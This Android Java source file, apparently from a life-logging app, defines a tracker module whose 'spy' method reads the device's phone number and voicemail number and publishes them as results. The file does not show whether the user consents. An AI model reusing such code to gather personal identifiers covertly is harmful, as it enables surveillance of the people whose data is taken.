package net.datadeer.app.lifestream;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import androidx.core.app.ActivityCompat;
import android.telephony.TelephonyManager;

import org.json.JSONException;
import org.json.JSONObject;

class TrackerPhoneNumbers implements TrackerMethod {
    @Override
    public void spy() {
        if (!TrackerManager.canTrack()) return;

        TelephonyManager tMgr = (TelephonyManager) TrackerManager.get().getSystemService(Context.TELEPHONY_SERVICE);
        if (ActivityCompat.checkSelfPermission(TrackerManager.get(), Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED &&
            ActivityCompat.checkSelfPermission(TrackerManager.get(), Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED &&
            ActivityCompat.checkSelfPermission(TrackerManager.get(), Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED)
                return;

        try {
            JSONObject ret = new JSONObject();
            ret.put("Line1Number",tMgr.getLine1Number());
            ret.put("VoiceMailNumber",tMgr.getVoiceMailNumber());

            TrackerManager.get().publishSpyResults(this,ret);

        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    @Override
    public String getName() {
        return "PhoneNumbers";
    }
}
